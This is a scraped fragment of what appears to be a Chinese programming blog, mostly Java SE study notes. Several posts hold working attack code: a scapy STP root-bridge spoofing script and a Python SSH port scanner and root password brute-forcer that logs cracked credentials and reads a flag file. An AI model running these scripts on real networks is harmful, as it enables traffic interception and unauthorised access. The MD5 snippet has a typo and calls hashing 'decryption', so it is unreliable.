它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。 例：nextInt() 之后又用 nexiLine() 获取的是整数，而实际是全部内容为 数值/r/n 此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。 解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。 String的构造方法12String str = new String(Byte[] b);//有参构造 可以按照平台的默认字符集（也就是码表，GBK等等）解码byte数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。 12String str = new String(Byte[] b,2,4);//表示从b数组中的第二个索引开始解码，总共解码4个数据 String类的判断功能 .equals() 比较字符串内容序列是否相同，区分大小写 .equalsIgnoreCase() 与上面不同的是：不区分大小写 .contains() 判断字符串中是否包含传入的字符串 .startsWith() 判断字符串是否以传入字符串开头 .endswith() 判断字符串是否以传入字符串结尾 .isEmpty() 判断字符串是否为空 Null与””的区别 “”是字符串常量，也是String类的对象，所以可以调用String类的方法 Null是空常量，不能调用任何方法，否则会出现空指针异常，Null可以给任意引用数据类型赋值。 注意事项： 1、以后比较字符串时最好都用equals，因为equals比较的是内容，而==号比较的时后，有时比较的是地址值 2、使用equals时，有常量就用常量对象的equals方法，尽量不用变量对象的equals方法，因为变量对象的值有可能时null，调用equals方法会出现空指针异常 String类的获取功能 .length() 获取字符串长度(字符个数) 例子：&quot;我&quot;.length() 为1 ps：数组中的length是属性，而String中的是对象方法 .charAt() 获取指定索引的字符 .indexOf() 返回字符 或 字符串在此字符串中第一次出现的索引 如果不存在返回-1 如果查找的是字符串，返回索引就是查找字符串第一个字符的索引 .indexOf(,) 与上面不同的是在某个位置之后查找 .lastIndexOf() 从后向前找 .substring() 从指定位置开始截取字符串，默认到末尾 .substring(,) 与上不同的是自己指定了截取字符串的尾部位置并且，包含头不包含尾部 注意：截取字符串之后需要用一个变量来保存，因为substring是不会改变原来的值的。 GBK码表的特性 1、中文是两个字节组成 2、中文字节的第一个字节一定是负数 String类的类型转换功能 .getBytes() 把字符串转换成字节数组，这是一个编码的过程：把我们看的懂的编码成计算机看得懂的 .toCharArray() 转换成字符数组 String.valueOf（） 把字符数组转换为字符串，传入一个字符数组，返回一个字符串 注意： 1、传入的数组类型可以是任意类型，并且底层还是由String的构造方法来解码的。 2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法 .toLowerCase() 把字符串转换为小写 .toUpperase() 把字符串转换为大写 ps：String中字符的转换都是按照unicode码表来转换的 String的其他功能 .repleace(被替换的字符串，要替换成的字符串) 字符或字符串替换，不存在则不改变 .trim() 去除首尾空格 .compareTo() 按照字典顺序比较两个字符串","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String类","slug":"String类","permalink":"http://liuhaoan.github.io/tags/String类/"}]},{"title":"javaSE复习之——Object类","slug":"javaSE复习之——Object类","date":"2019-04-09T07:19:43.000Z","updated":"2019-04-09T07:40:26.878Z","comments":true,"path":"2019/04/09/javaSE复习之——Object类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Object类/","excerpt":"Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。","text":"Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。 重写toString代码示例：123public Stirng toString() &#123; return name + \",\" + age;&#125; equals方法 equals方法默认是比较地址值，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象没有重写equals，那么调用它是无意义的。 重写equals代码演示：12345//重写equals方法public boolean equals(Object obj) &#123; Student s = (Student)obj; return this.name.equals(s.name) &amp;&amp;this.age == s.age; //这里的equals调用的是string里的方法&#125; ==号和equsls的区别（面试可能问道）： 1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是 数据值，比较引用数据类型比较的是地址的值 2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没 有意义，但是我们可以重写它使其有意义。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Object类","slug":"Object类","permalink":"http://liuhaoan.github.io/tags/Object类/"}]},{"title":"javaSE复习之——Idea常用快捷键","slug":"javaSE复习之——Idea常用快捷键","date":"2019-04-09T07:14:05.000Z","updated":"2019-04-09T07:19:06.850Z","comments":true,"path":"2019/04/09/javaSE复习之——Idea常用快捷键/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Idea常用快捷键/","excerpt":"暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示","text":"暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示 ctrl+Y 删除光标所在行 ctrl+D 复制光标所在行，并且粘贴在它的下面 ctrl+alt+L 格式化代码 ctrl+/ 单行注释 Ctrl+shift+/ 选中行注释，多行注释 alt+ins 自动生成代码，get、set等 alt+shift+上下箭 移动当前代码行","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"idea快捷键","slug":"idea快捷键","permalink":"http://liuhaoan.github.io/tags/idea快捷键/"}]},{"title":"javaSE复习之——Eclipse常用快捷键","slug":"javaSE复习之——Eclipse常用快捷键","date":"2019-04-09T07:00:39.000Z","updated":"2019-04-09T07:31:25.025Z","comments":true,"path":"2019/04/09/javaSE复习之——Eclipse常用快捷键/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Eclipse常用快捷键/","excerpt":"常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建","text":"常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建ctrl + shift + f 格式化代码，使代码更简洁 ctrl + / 注释 也可以ctrl + shift + /或\\ F3或ctrl + 鼠标点击 查看源码 ctrl + 1 给建议 alt + shift + m 抽取一段代码成方法，省去了复制 alt + shift + r 改名，在改变量是非常好用 shift + alt + s 生成toString Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定) Ctrl+D: 删除当前行 Ctrl+Alt+↓ 复制当前行到下一行(复制增加) Ctrl+Alt+↑ 复制当前行到上一行(复制增加) Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) Alt+↑ 当前行和上面一行交互位置(同上)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Eclipse快捷键","slug":"Eclipse快捷键","permalink":"http://liuhaoan.github.io/tags/Eclipse快捷键/"}]},{"title":"网络攻防之——Python实现生成树协议(STP)欺骗攻击","slug":"网络攻防之——Python实现生成树协议欺骗攻击","date":"2019-04-09T02:09:48.000Z","updated":"2019-04-09T06:54:07.448Z","comments":true,"path":"2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/","excerpt":"何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例","text":"何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例 12345678910111213#!/usr/bin/pythonfrom scapy.all import *//01:80:c2:00:00:00这个是一个组播地址eth = Dot3(dst=\"01:80:c2:00:00:00\", src=\"自己的MAC地址\")llc = LLC()stp = STP(rootid=0, rootmac=\"自己的MAC地址\", bridgeid=0, bridgemac=\"自己的MAC地址\")pkt=sendp(eth/llc/stp,inter=2,loop=1)","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://liuhaoan.github.io/tags/Python/"},{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/tags/网络攻防/"},{"name":"生成树协议欺骗","slug":"生成树协议欺骗","permalink":"http://liuhaoan.github.io/tags/生成树协议欺骗/"}]},{"title":"javaSE复习之——面向对象_内部类","slug":"javaSE复习之——面向对象-内部类","date":"2019-04-08T05:22:50.000Z","updated":"2019-04-08T11:51:45.602Z","comments":true,"path":"2019/04/08/javaSE复习之——面向对象-内部类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/","excerpt":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在","text":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在 内部类的分类成员内部类 它定义在一个类的内部 局部内部类 它定义在一个方法或者一个作用域内部，它的访问仅限于方法内或者该作用域内 注意事项： 局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的 匿名内部类 匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护 例如：为按钮设置一个监听器12345678new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 静态内部类 它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static 内部类的面试题之 —— 内部类能不能访问外部类成员变量？ 答（成员内部类）： 内部类可以访问外部类的成员变量，因为编译器底层在创建成员内部类时，为成员内部类加上了指向外部类的引用 示例： 12外部类.this.成员变量外部类.this.成员方法 ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了 例子： 1234567891011121314151617181920class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 匿名内部类访问外部类成员底层实现原理： 我们用一段代码来举例：1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#125; public void test() &#123; final int a = 10; new Thread()&#123; public void run() &#123; System.out.println(a); &#125;; &#125;.start(); &#125;&#125; 当test方法调用，系统会给内部类自动加上构造器（这也就是为什么匿名内部类不能有构造方法的原因），这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。这样就解决了生命周期的问题 但是还有一个数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用final修饰 jdk8新特性 局部内部类与匿名内部类访问外部类成员变量，外部类那个变量不需要final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。 匿名内部类 格式： 12345//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法new 类名或者抽象类名() &#123; &#125;.方法名（）//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法 解释： 可以吧new 到 } 的代码看作创建的一个子类对象实例，所以后面可以.方法名调用 好处： 可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。 注意事项： 1、匿名内部类只针对重写一个方法使用，如果要一次性重写多个方法的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则重新定义类。 2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。 3、匿名内部类中不能定义构造函数。 4、使用匿名内部类时，我们必须是继承一个类或者实现一个接口，但是两者不可兼得，只能继承一个类或者实现一个接口。 5、匿名内部类中不能存在任何的静态成员变量和静态方法。 6、匿名内部类属于局部内部类，所以局部内部类所有限制都在匿名内部类上生效 7、匿名内部类不能是抽象的，它必须实现继承的类或者接口中的抽象方法 链式编程： 特点： 调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"内部类","slug":"内部类","permalink":"http://liuhaoan.github.io/tags/内部类/"},{"name":"匿名内部类","slug":"匿名内部类","permalink":"http://liuhaoan.github.io/tags/匿名内部类/"},{"name":"链式编程","slug":"链式编程","permalink":"http://liuhaoan.github.io/tags/链式编程/"}]},{"title":"网络攻防之——Python实现MD5加密","slug":"网络攻防之——Python实现MD5加密","date":"2019-04-08T02:27:04.000Z","updated":"2019-04-08T11:47:03.871Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现MD5加密/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/","excerpt":"代码示例","text":"代码示例 123456789101112#!/usr/bin/python3import hashilbstr = input(“请输入要解密的字符串：”)md5 = hashlib.md5()//创建MD5加密对象md5.update(str.encode(\"utf-8\"))//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密print(md5.hexdigest())//获取MD5加密后的16进制输出打印","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"MD5加密","slug":"MD5加密","permalink":"http://liuhaoan.github.io/tags/MD5加密/"},{"name":"Python","slug":"Python","permalink":"http://liuhaoan.github.io/tags/Python/"}]},{"title":"网络攻防之——Python实现ssh端口扫描并爆破","slug":"网络攻防之——Python实现ssh端口扫描并爆破","date":"2019-04-08T02:23:38.000Z","updated":"2019-04-09T02:02:24.884Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","excerpt":"实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例","text":"实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python3import threadingimport pexpectfrom socket import *key = [pexpect.TIMEOUT, \"#\", \"\\$\", \"&gt;\", \"&gt;&gt;&gt;\", \"&amp;\"]loginKey = [pexpect.TIMEOUT, \"[p|P]assword\", \"yes\"]def getFlag(p, ret): p.sendline(\"cat ../../../../flag\") p.expect(key) ret += \" flag:\\n\" + str(p.before) print(ret) file = open(\"flag.txt\", \"a+\") file.write(ret) file.close()def getPass(ip, passwd): p = pexpect.spawn(\"ssh root@\" + ip, timeout=1) try: b = p.expect(loginKey) if b == 1: p.sendline(passwd) b = p.expect(key) if b &gt; 0: getFlag(p, ip + \" passwd:\" + passwd) return 1 except: pass finally: p.close() return 0def scan(ip): s = socket(AF_INET, SOCK_STREAM) s.settimeout(1) try: s.connect((ip, 22)) b = True for n in open(\"passwd\"): passwd = n.strip(); if getPass(ip, passwd) == 1: b = False break if b: file = open(\"ip.txt\", \"a+\") file.write(ip + \"\\n\") file.close() except: pass finally: s.close()for n in range(1, 255): for nn in range(1, 255): ip = \"192.168.\" + str(n) + \".\" + str(nn) while True: if len(threading.enumerate()) &lt; 255: break threading.Thread(target=scan, args=(ip,)).start()","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/tags/网络攻防/"},{"name":"python","slug":"python","permalink":"http://liuhaoan.github.io/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"http://liuhaoan.github.io/tags/ssh/"},{"name":"爆破","slug":"爆破","permalink":"http://liuhaoan.github.io/tags/爆破/"},{"name":"端口扫描","slug":"端口扫描","permalink":"http://liuhaoan.github.io/tags/端口扫描/"}]},{"title":"javaSE复习之——面向对象_包与权限修饰符","slug":"javaSE复习之——面向对象-包与权限修饰符","date":"2019-04-07T09:55:53.000Z","updated":"2019-04-08T11:49:47.182Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","excerpt":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。","text":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。 定义包的格式12package 包名;多级包用“.”分开 例子： 1package java.util.Scanner; 在这里当然也可以把Scanner用*代替，*就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为需要遍历该包所有类。 ps：在开发中一般都不使用，而是导入具体的类。 定义时的注意事项 1、必须是程序的第一条可执行语句2、package在一个java文件中只能有一个3、包名的格式为域名倒写 例：com.aikan0.add这个add就是这个包的作用。 生成包命令1javac -d . 源文件名 ps：了解一下就好了 面试题——package、import、class有没有顺序关系？ 解答： 有，并且package &gt; import &gt; class 权限修饰符 四种权限修饰符 本类 同一个包下(子类和无关类) 不同包下(子类) 不同包下(无关类) private Y 默认 Y Y protected Y Y Y public Y Y Y Y ps：protected表示受保护的，就是保护权限只给给自己的子类，一般不用在变量，而是用在成员变量或者成员方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"包","slug":"包","permalink":"http://liuhaoan.github.io/tags/包/"},{"name":"权限修饰符","slug":"权限修饰符","permalink":"http://liuhaoan.github.io/tags/权限修饰符/"}]},{"title":"javaSE复习之——面向对象_接口","slug":"javaSE复习之——面向对象-接口","date":"2019-04-07T09:22:46.000Z","updated":"2019-04-08T11:50:50.335Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-接口/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/","excerpt":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口","text":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口 特点： a : 接口用关键字interface表示 1interface 接口名 &#123;&#125; b : 类实现接口用implements表示 1class 类名 implements 接口名 &#123;&#125; c : 接口不能实例化 那么，接口如何实例化呢? 答：按照多态的方式来实例化。 d : 接口的子类 a : 可以是抽象类。但是意义不大。b : 可以是具体类。要重写接口中的所有抽象方法。(推荐方案) 注意事项： 1、接口中的成员变量默认都是常量，他会自动加public static final关键字，并且可以互相交换位置，新手平时都手动给出。 2、接口中没有构造方法 3、接口是干爹，不是亲爹，子类不能用super访问父类中的内容，子类默认继承object类 4、接口中不能定义非抽象方法 5、类与接口是实现关系而非继承关系（干爹） 6、同一个类可以实现多个接口 例子：1class Deom implements InterA,InterB &#123;&#125; 8、接口不能实现接口（implements），但是却可以继承（extends） 类 与 接口的关系 a : 类与类： 继承关系,只能单继承,可以多层继承。 b : 类与接口： 实现关系,可以单实现,也可以多实现。并且还可以在继承一个类的同时实现多个接口。 c : 接口与接口： 继承关系,可以单继承,也可以多继承。 抽象类 与 接口的区别： 抽象类： 和普通的类差不多，只是可以定义抽象方法而已 接口： 成员变量：只可以常量成员方法：只可以抽象 设计理念区别（重要）： 抽象类： 定义的是该继承体系的共性功能 例：每个学生都需要学习 接口： 定义的是该继承体系的扩展性功能 例：每个学生在学校的学习方式都不一样，这样就需要扩展 设计理念区别： 接口是对动作的抽象，抽象类是对根源的抽象。 抽象类表示的是：这个对象是什么。 接口表示的是：这个对象能做什么。 比如：男人，女人，这两个类，他们的抽象类是人。说明：他们都是人，他们的根源就是人 又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。说明：他们都可以吃东西，他们的根源是不同的，但是做的动作却相同的。 结论 在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。 当关注一个事物的本质的时候，用抽象类； 当关注一个要做的动作的时候，用接口。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"接口","slug":"接口","permalink":"http://liuhaoan.github.io/tags/接口/"}]},{"title":"javaSE复习之——面向对象_抽象类","slug":"javaSE复习之——面向对象-抽象类","date":"2019-04-07T09:04:40.000Z","updated":"2019-04-08T11:50:10.066Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-抽象类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/","excerpt":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写","text":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写 抽象类的几个问题： 1、为什么不直接定义空方法？ 解答：抽象类可以正确的引导使用者正确使用它们，减少被误用 2、抽象类有什么作用？ 解答：增强程序的扩展性和兼容性，规范编程 抽象类中的面试题： 1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化） 2、abstract不能和static共存 原因：static让这个方法是静态方法，而静态方法可以用类名.方法名调用，而静态方法可以类名.方法名调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而abstract不能和static共存。 3、abstract不能和final共存 原因：abstract强制子类重写，而final表示最终的，它不让子类重写，这里形成了冲突。 4、abstract不能和private共存 原因：abstract强制子类重写，而private让子类访问不到，所以它们两个修饰符形成了冲突。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"抽象类","slug":"抽象类","permalink":"http://liuhaoan.github.io/tags/抽象类/"}]},{"title":"javaSE复习之——面向对象_多态","slug":"javaSE复习之——面向对象-多态","date":"2019-04-07T07:58:33.000Z","updated":"2019-04-08T11:50:27.981Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-多态/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/","excerpt":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi();","text":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi(); 成员变量 编译、运行看左边(父类) 也就是创建对象后，子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)，父类引用对象就优先调用父类（编译运行看左边） 解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是父类那么这个引用指向super区域，否则指向this区域 成员方法 编译看左边(父类)、运行看右边(子类)。动态绑定 ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。 静态成员方法 与成员变量同理，编译、运行看左边(父类)，所以多态中静态方法不存在重写 多态的弊端 父类引用不能使用子类特有的属性和行为，但是能通过1zi b = (zi)a; //强转类型 多态的好处 1、提高了代码的维护性(继承保证) 2、提高了代码的扩展性(由多态保证) 多态的使用 1、开发是很少在创建对象的时候使用多态，而是直接创建子类引用子类对象 2、在需要使用方法使代码简洁时，当做参数使用多态效果最好，因为扩展性强 比如：现有三个类“动物”“狗”“猫”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用方法函数来使代码简洁，在调用这个方法时可以创建好一个 狗 或 猫 的对象然后传给参数，这就需要使用到多态了，如果不使多态那么就需要给狗和猫分别创建一个函数。 不过在方法中使用多态还有一个问题：狗 和 猫 都有各自特有的功能与属性，如果调用猫的功能，但是传入的对象是狗，那么就出错了。 解决方法：关键字 instanceof ps：了解一下，开发中用到的不多，一般都用到方法重写 代码实例：12对象变量A instanceof 对象变量B//如果是相同的类返回true 多态中的代码分析123456789101112131415161718192021222324252627282930class A &#123; public void show() &#123; show2(); //这里调用的是子类中的show方法 &#125; public void show2() &#123; System.out.println(\"我\"); &#125;&#125;class B extends A &#123; public void show2() &#123; System.out.println(\"爱\"); &#125;&#125;class C extends B &#123; public void show() &#123; super.show(); &#125; public void show2() &#123; System.out.println(\"你\"); &#125;&#125;public class Test2DuoTai &#123; public static void main(String[] args) &#123; A a = new B(); a.show();//返回一个爱 B b = new C(); b.show(); &#125;&#125; 得出结果： 在多态中，父类中的方法调用另一个方法，且被调用的方法都存在于子类与父类中的情况下，优先调用子类的方法，也就是父类方法成为了一个跳板，跳转到了子类的方法中 还是那句话： 成员方法编译看左边(父类)、运行看右边(子类) 成员变量编译看左边(父类)、运行看左边(父类)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"多态","slug":"多态","permalink":"http://liuhaoan.github.io/tags/多态/"}]},{"title":"javaSE复习之——面向对象_代码块与继承","slug":"javaSE复习之——面向对象-代码块与继承","date":"2019-04-06T02:08:03.000Z","updated":"2019-04-08T11:50:22.436Z","comments":true,"path":"2019/04/06/javaSE复习之——面向对象-代码块与继承/","link":"","permalink":"http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/","excerpt":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{}","text":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{} 如何创建一个静态方法？ 在方法中加static修饰，那么这个方法是静态方法（函数） 在载入类的时候就这个方法就已经在类的静态区创建，不需要创建对象即可调用 静态变量 在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。 比如 第一条命令给这个变量赋值“张三” 第二条命令又给这个变量赋值“李四” 那么之后调用这个变量时，这个变量返回“李四” 二、构造方法 与 代码块构造方法 构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果 系统会自动创建空参构造，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出 代码块局部代码块 它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率 构造代码块 (初始化块) 构造代码块可以在一个类中执行，执行完就弹栈， 例： 1class Deom&#123; &#123;这就是构造代码块&#125; &#125; ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行 构造代码块可以把一些初始化的代码放在其中，每次调用构造都执行，并且在构造方法之前执行 ps：实际上构造方法开发中用到的不多，但是面试可能会问 构造代码块可以做的功能： 我们可以做诸如统计创建对象的次数等功能。 静态代码块 例： 1static &#123;&#125; 作用： 用于给类进行初始化，在加载的时候就执行，并且只执行一次。 一般用于加载驱动，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。 比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。 注意事项： 1、静态代码块不能访问普通变量 2、静态代码块在 类 中，优先于主方法（面试题） 3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块 类的继承 ps：继承与升级一般都用作系统升级 父类 &gt; 子类 继承的定义 class 子类(当前类) extends 父类(继承的类) ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法 继承的好处： 1、可以提升代码的复用性，不需要打太多重复的代码 